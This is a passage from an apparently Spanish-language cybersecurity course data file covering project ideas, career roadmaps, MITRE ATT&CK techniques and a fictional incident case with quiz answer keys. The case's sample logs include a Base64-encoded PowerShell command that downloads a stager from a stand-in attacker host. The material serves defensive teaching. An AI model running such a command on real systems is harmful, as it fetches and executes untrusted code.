      "level": "Principiante",
      "category": "Programación",
      "description": "Desarrollar una aplicación de consola en Python que permita consultar la reputación de una IP u obtener el hash MD5/SHA256 de cualquier archivo ingresado.",
      "skills": [
        "Python",
        "Manejo de archivos",
        "Librería hashlib",
        "Argumentos CLI"
      ],
      "deliverable": "Script `.py` documentado que acepte argumentos por línea de comandos y genere un reporte en consola."
    },
    {
      "id": "proj-02",
      "title": "Proyecto 2: Analizador Básico de Logs (Log Parser)",
      "level": "Principiante",
      "category": "SOC & Blue Team",
      "description": "Crear un script en Python o Bash que procese archivos de log `/var/log/auth.log` o registros de Nginx, identifique direcciones IP con más de 10 intentos fallidos de acceso y genere una lista negra de IPs.",
      "skills": [
        "Expresiones Regulares (Regex)",
        "Parsing de Texto",
        "Log Analysis",
        "Bash/Python"
      ],
      "deliverable": "Script que reciba un archivo de log y devuelva una tabla resumen con IPs atacantes e intentos acumulados."
    },
    {
      "id": "proj-03",
      "title": "Proyecto 3: Escáner de Puertos Multihilo para Laboratorio",
      "level": "Intermedio",
      "category": "Redes & Pentesting",
      "description": "Construir un escáner de puertos rápido en Python utilizando hilos (Threading) para verificar el estado de los puertos 1-1024 en hosts de laboratorio autorizado.",
      "skills": [
        "Sockets TCP",
        "Multithreading",
        "Manejo de timeouts",
        "Estructuras de datos"
      ],
      "deliverable": "Herramienta funcional que reporte servicios activos y banners de respuesta."
    },
    {
      "id": "proj-04",
      "title": "Proyecto 4: Monitor de Red Local y Alerta ARP Spoofing",
      "level": "Intermedio",
      "category": "Seguridad de Redes",
      "description": "Desarrollar un script con Scapy o sockets que inspeccione las tablas ARP locales y alerte en pantalla si detecta cambios de dirección MAC asociados a la IP del Gateway por envenenamiento ARP.",
      "skills": [
        "Scapy",
        "Inspección de capas de red",
        "Protocolo ARP",
        "Alertamiento"
      ],
      "deliverable": "Script monitor de red en tiempo real que emita un aviso cuando cambie la MAC por defecto."
    },
    {
      "id": "proj-05",
      "title": "Proyecto 5: Sistema de Detección de Intrusos (IDS) Ligero",
      "level": "Avanzado",
      "category": "Blue Team & SOC",
      "description": "Crear un pequeño agente IDS en Python que lea eventos en vivo de la red o sistema de archivos y dispare alertas según un archivo de reglas YAML/JSON personalizado.",
      "skills": [
        "Diseño de Reglas de Detección",
        "YAML/JSON parsing",
        "Monitoreo en tiempo real",
        "Logging"
      ],
      "deliverable": "Motor IDS liviano ejecutable en segundo plano con consola de eventos."
    },
    {
      "id": "proj-06",
      "title": "Proyecto 6: Mini SIEM Educativo con Interfaz Web",
      "level": "Avanzado",
      "category": "SOC & SIEM",
      "description": "Desplegar un panel web interactivo sencillo (usando Flask/FastAPI o HTML/JS local) que ingiera logs de prueba, clasifique severidades e identifique correlaciones de eventos.",
      "skills": [
        "Dashboarding",
        "Correlación de eventos",
        "APIs REST",
        "Visualización de datos"
      ],
      "deliverable": "Mini SIEM funcional capaz de mostrar gráficos de eventos y filtrar por severidad."
    },
    {
      "id": "proj-07",
      "title": "Proyecto 7: Laboratorio Virtual de Active Directory",
      "level": "Avanzado",
      "category": "Active Directory",
      "description": "Configurar una infraestructura de laboratorio en VirtualBox/VMware compuesta por un Windows Server (Controlador de Dominio), dos clientes Windows 11 y un Linux de auditoría.",
      "skills": [
        "Active Directory",
        "DNS de dominio",
        "GPOs",
        "Kerberos",
        "Virtualización"
      ],
      "deliverable": "Documentación paso a paso de la topología de red, usuarios creados y políticas de seguridad aplicadas."
    },
    {
      "id": "proj-08",
      "title": "Proyecto 8: Entorno de Análisis de Malware Aislado (Sandbox)",
      "level": "Experto",
      "category": "Malware & Forense",
      "description": "Diseñar y desplegar una máquina virtual Windows 'Air-Gapped' (sin salida a red exterior) equipada con Procmon, Wireshark, x64dbg y Fakenet-NG para analizar comportamiento de ejecutable de prueba seguro.",
      "skills": [
        "Aislamiento de hypervisor",
        "Forense en caliente",
        "Monitoreo de red/disco",
        "Sandboxing"
      ],
      "deliverable": "Informe ejecutivo de análisis forense dynamic y estático simulado."
    }
  ],
  "roadmaps": [
    {
      "role": "SOC Analyst (Analista de SOC Nivel 1/2)",
      "description": "Profesional encargado del monitoreo continuo, triaje de alertas de seguridad, análisis de logs y contención inicial de incidentes.",
      "keySkills": [
        "Análisis de Logs",
        "SIEM (Splunk/Sentinel)",
        "Redes TCP/IP",
        "Wireshark",
        "Triage de Alertas",
        "MITRE ATT&CK"
      ],
      "certifications": [
        "CompTIA Security+",
        "Cisco CyberOps Associate",
        "BTL1 (Blue Team Level 1)"
      ],
      "recommendedModules": [
        "mod-01",
        "mod-04",
        "mod-05",
        "mod-06",
        "mod-07",
        "mod-09",
        "mod-10"
      ]
    },
    {
      "role": "Pentester / Red Teamer",
      "description": "Especialista en seguridad ofensiva que simula ciberataques reales autorizados para identificar vulnerabilidades antes que los ciberdelincuentes.",
      "keySkills": [
        "Metodología de Pentesting",
        "OWASP Top 10",
        "Metasploit",
        "Nmap",
        "Burp Suite",
        "Python Scripting",
        "Escalada de Privilegios"
      ],
      "certifications": [
        "eJPT (eLearnSecurity Junior Penetration Tester)",
        "OSCP (Offensive Security Certified Professional)",
        "PNPT"
      ],
      "recommendedModules": [
        "mod-04",
        "mod-05",
        "mod-06",
        "mod-07",
        "mod-08",
        "mod-09",
        "mod-10"
      ]
    },
    {
      "role": "Incident Responder & Digital Forensics (DFIR)",
      "description": "Detective de ciberseguridad enfocado en la adquisición de evidencia, análisis de volcado de memoria RAM, inspección de discos y mitigación de intrusiones complejas.",
      "keySkills": [
        "Volatility Framework",
        "Autopsy",
        "Análisis de Registro Windows",
        "Timeline Analysis",
        "Ensamble & Artefactos",
        "Scripting"
      ],
      "certifications": [
        "GIAC Certified Forensic Analyst (GCFA)",
        "Certified Computer Examiner (CCE)",
        "eCDFP"
      ],
      "recommendedModules": [
        "mod-02",
        "mod-03",
        "mod-04",
        "mod-05",
        "mod-06",
        "mod-10"
      ]
    },
    {
      "role": "Malware Analyst & Reverse Engineer",
      "description": "Especialista en descompilar y analizar muestras maliciosas para entender su funcionamiento interno, indicadores de compromiso y algoritmos de cifrado.",
      "keySkills": [
        "Ensamblador x86/x64",
        "Ghidra / IDA Pro",
        "Debuggers (x64dbg)",
        "Análisis Estático y Dinámico",
        "C / C++",
        "Sandboxing"
      ],
      "certifications": [
        "GREM (GIAC Reverse Engineering Malware)",
        "eCRE (eLearnSecurity Certified Reverse Engineer)"
      ],
      "recommendedModules": [
        "mod-02",
        "mod-03",
        "mod-05",
        "mod-08"
      ]
    },
    {
      "role": "Cloud Security Engineer",
      "description": "Ingeniero encargado de diseñar, implementar y asegurar arquitecturas y cargas de trabajo en la nube (AWS, Azure, GCP, Kubernetes).",
      "keySkills": [
        "AWS / Azure IAM",
        "Seguridad de Contenedores (Docker/K8s)",
        "DevSecOps",
        "CI/CD Security",
        "Infraestructura como Código (Terraform)"
      ],
      "certifications": [
        "AWS Certified Security - Specialty",
        "CCSK (Certificate of Cloud Security Knowledge)",
        "AZ-500"
      ],
      "recommendedModules": [
        "mod-01",
        "mod-04",
        "mod-06",
        "mod-07",
        "mod-08"
      ]
    }
  ],
  "cases": [
    {
      "id": "case-01",
      "title": "Caso Ficticio #01: La Intrusión Nocturna en Finanzas Inc.",
      "company": "Finanzas Inc.",
      "summary": "El domingo a las 02:15 AM, el SIEM generó alertas críticas de transferencia anómala de archivos desde un servidor interno de base de datos hacia una IP en el exterior.",
      "logs": [
        "2026-08-10 02:05:12 - EventID 4624 (Successful Logon) - User: jgarcia - IP: 185.220.101.5 (VPN External)",
        "2026-08-10 02:07:45 - Sysmon Event 1 (Process Create) - powershell.exe -ArgumentList '-e aHR0cDovL2F0dGFja2VyLmNvbS9zdGFnZXIucHMx'",
        "2026-08-10 02:10:30 - Firewall Alert - Outbound Connection TCP/443 -> IP: 185.220.101.5 (Volume: 2.4 GB)",
        "2026-08-10 02:14:00 - Sysmon Event 11 (FileCreate) - C:\\Windows\\Temp\\vssadmin_delete.bat"
      ],
      "questions": [
        {
          "id": "c1-q1",
          "question": "¿Cuál fue el vector inicial de acceso comprometido?",
          "options": [
            "Vulnerabilidad en el sitio web público",
            "Credenciales robadas de la cuenta de VPN del usuario 'jgarcia'",
            "Infección por USB físico",
            "Ataque de denegación de servicio"
          ],
          "answer": 1,
          "explanation": "El log de inicio de sesión EventID 4624 muestra un acceso exitoso del usuario 'jgarcia' desde una IP externa no corporativa (185.220.101.5) a través de la VPN."
        },
        {
          "id": "c1-q2",
          "question": "¿Qué acción ejecutó el atacante a través de PowerShell a las 02:07:45?",
          "options": [
            "Una copia de seguridad programada",
            "Descarga y ejecución de un stager malicioso codificado en Base64",
            "Actualización de parches de Windows",
            "Un reinicio del sistema"
          ],
          "answer": 1,
          "explanation": "La opción `-e` de PowerShell indica una cadena codificada en Base64 que decodifica hacia la URL del stager malicioso."
        },
        {
          "id": "c1-q3",
          "question": "¿Qué medida de contención inmediata debe aplicar el analista de respuesta a incidentes?",
          "options": [
            "Esperar al lunes por la mañana para hablar con el usuario 'jgarcia'",
            "Desactivar inmediatamente la cuenta de VPN de 'jgarcia', aislar el host infectado y bloquear la IP 185.220.101.5 en el firewall",
            "Formatear de inmediato el servidor web público",
            "Aumentar el tamaño del disco duro"
          ],
          "answer": 1,
          "explanation": "Revocar credenciales comprometidas, aislar la máquina de red y bloquear la IP externa detiene la exfiltración activa de datos."
        }
      ]
    }
  ],
  "mitre": [
    {
      "tactic": "Reconnaissance (Reconocimiento)",
      "description": "Tácticas para recopilar información que se utiliza para planificar futuras operaciones adversas.",
      "techniques": [
        {
          "id": "T1595",
          "name": "Active Scanning",
          "desc": "Escaneo activo de IP, puertos y vulnerabilidades utilizando herramientas como Nmap.",
          "detection": "Alertas de firewall por escaneos de puertos y múltiples conexiones rechazadas.",
          "mitigation": "Filtrado estricto de tráfico entrante y limitación de servicios expuestos."
        }
      ]
    },
    {
      "tactic": "Initial Access (Acceso Inicial)",
      "description": "Tácticas para obtener una entrada inicial dentro de la red de la organización.",
      "techniques": [
        {
          "id": "T1566",
          "name": "Phishing",
          "desc": "Envío de correos electrónicos maliciosos con enlaces o adjuntos infectados.",
          "detection": "Filtros de correo (SPF, DKIM, DMARC), inspección de adjuntos y análisis de comportamiento de enlaces.",
          "mitigation": "Concientización del personal, autenticación MFA y filtrado web antiphishing."
        },
        {
          "id": "T1190",
          "name": "Exploit Public-Facing Application",
          "desc": "Aprovechamiento de vulnerabilidades en aplicaciones web o servicios expuestos a Internet.",
          "detection": "WAF (Web Application Firewall) e inspección de logs de servidores web.",
          "mitigation": "Gestión activa de parches y bastionado de servidores web."
        }
      ]
    },
    {
      "tactic": "Execution (Ejecución)",
      "description": "Tácticas que provocan la ejecución de código controlado por el adversario en un sistema local o remoto.",
      "techniques": [
        {
          "id": "T1059.001",
          "name": "Command and Scripting Interpreter: PowerShell",
          "desc": "Uso del entorno de comandos PowerShell para ejecutar scripts, comandos ofuscados y descargar cargas útiles.",
          "detection": "Sysmon Event ID 1 / Script Block Logging (Event ID 4104).",
          "mitigation": "Restringir PowerShell mediante Constrained Language Mode y políticas de ejecución firmadas."
        }
      ]
    },
    {
      "tactic": "Persistence (Persistencia)",
      "description": "Tácticas empleadas para mantener el acceso a los sistemas a través de reinicios o cambios de credenciales.",
      "techniques": [
        {
          "id": "T1547.001",
          "name": "Boot or Logon Autostart Execution: Registry Run Keys",
          "desc": "Adición de claves ejecutoras en el Registro de Windows (HKLM/HKCU Run).",
          "detection": "Sysmon Event ID 12/13 (Registro) y monitoreo de claves de inicio.",
          "mitigation": "Restricción de permisos de edición en el Registro de Windows."
        }
      ]
    },
    {
      "tactic": "Credential Access (Acceso a Credenciales)",
      "description": "Tácticas para robar credenciales como nombres de usuario y contraseñas.",
      "techniques": [
        {
          "id": "T1003",
          "name": "OS Credential Dumping",
          "desc": "Extracción de credenciales de la memoria del proceso LSASS en Windows.",
          "detection": "Alertas de EDR por lectura del proceso `lsass.exe` por ejecutables no autorizados.",
          "mitigation": "Habilitar LSA Protection (RunAsPPL) y Credential Guard en Windows 11."
        }
      ]
    },
    {
      "tactic": "Defense Evasion (Evasión de Defensas)",
      "description": "Tácticas empleadas por los adversarios para evitar ser detectados durante su intrusión.",
      "techniques": [
        {
          "id": "T1070",
          "name": "Indicator Removal: Clear Windows Event Logs",
          "desc": "Borrado deliberado de registros de eventos para eliminar evidencia forense.",
          "detection": "Event ID 1102 (Security log cleared) en el registro de auditoría de Windows.",
          "mitigation": "Envío inmediato de logs en tiempo real a un servidor SIEM externo inmutable."
        }
      ]
    }
  ]
};
